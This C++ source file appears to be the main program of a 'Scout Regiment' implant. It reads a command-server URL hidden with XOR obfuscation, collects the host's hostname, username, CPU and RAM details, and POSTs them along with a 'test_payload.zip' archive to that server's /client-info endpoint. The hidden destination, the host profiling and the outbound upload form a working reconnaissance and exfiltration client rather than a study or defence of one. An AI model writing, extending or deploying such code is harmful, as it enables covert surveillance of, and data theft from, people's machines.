#include <iostream>
#include <string>

#include "scout.hpp"
#include "network.hpp"

#include <fstream>
#include <vector>
#include <stdexcept>
#include <string>

namespace {

    constexpr unsigned char XOR_KEY = 0x5A;

    std::string xor_transform(const std::string& input)
    {
        std::string output = input;

        for (char& c : output) {
            c ^= XOR_KEY;
        }

        return output;
    }

    std::string load_api_url(const std::string& path)
    {
        std::ifstream file(path, std::ios::binary);

        if (!file) {
            throw std::runtime_error("Unable to open destination file");
        }

        const std::string encrypted{
            std::istreambuf_iterator<char>(file),
            std::istreambuf_iterator<char>()
        };


        if (encrypted.empty()) {
            throw std::runtime_error("Destination file is empty");
        }

        return xor_transform(encrypted);
    }

    std::vector<std::byte> load_file(const std::string& path)
    {
        std::ifstream file(path, std::ios::binary);

        if (!file) {
            throw std::runtime_error("Unable to open file: " + path);
        }

        file.seekg(0, std::ios::end);
        const auto size = file.tellg();
        file.seekg(0, std::ios::beg);

        if (size < 0) {
            throw std::runtime_error("Unable to determine file size: " + path);
        }

        std::vector<std::byte> data(static_cast<std::size_t>(size));

        if (!data.empty()) {
            file.read(
                reinterpret_cast<char*>(data.data()),
                      static_cast<std::streamsize>(data.size())
            );
        }

        if (!file) {
            throw std::runtime_error("Unable to read file: " + path);
        }

        return data;
    }



}

void log_msg(const auto& msg)
{
    std::cout << "[Scout Regiment] " << msg << std::endl;
}

static const auto info_opt = scoutreg::collect_system_info();

int main()
{
    std::string api_url;

    try {
        api_url = load_api_url("dest");
    }
    catch (const std::exception& e) {
        std::cerr << "Failed to load API URL: "
        << e.what() << '\n';
        return 1;
    }

    log_msg("System initialized");

    log_msg("Collecting system information");

    if (!info_opt) {
        log_msg("Failed to collect system inforamtion");
        return 1;
    }
    else {
        log_msg("Successfully collected system information\n");
    }

    auto info = info_opt.value();

    log_msg("Hostname: ");
    log_msg(info.hostname);

    log_msg("Username: ");
    log_msg(info.username);

    log_msg("CPU Architecture: ");
    log_msg(info.cpu_arch);

    log_msg("CPU Cores: ");
    log_msg(info.cpu_cores);

    log_msg("RAM Total: ");
    log_msg(info.total_ram);

    log_msg("RAM Available: ");
    log_msg(info.available_ram);

    long http_status = 0;

    // const std::vector<std::byte> empty_file;

    std::vector<std::byte> test_zip;

    try {
        test_zip = load_file("test_payload.zip");
    }
    catch (const std::exception& e) {
        std::cerr << "Failed to load test_payload.zip: "
        << e.what() << '\n';
        return 1;
    }

    log_msg("Loaded test_payload.zip");
    log_msg(test_zip.size());

    const bool success = scoutreg::network::post(
        api_url + "/client-info",
        info,
        test_zip,
        &http_status
    );

    if (!success) {
        std::cerr << "POST /client-info failed";

        if (http_status != 0) {
            std::cerr << ", HTTP status: " << http_status;
        }

        std::cerr << '\n';
        return 1;
    }


    return 0;
}
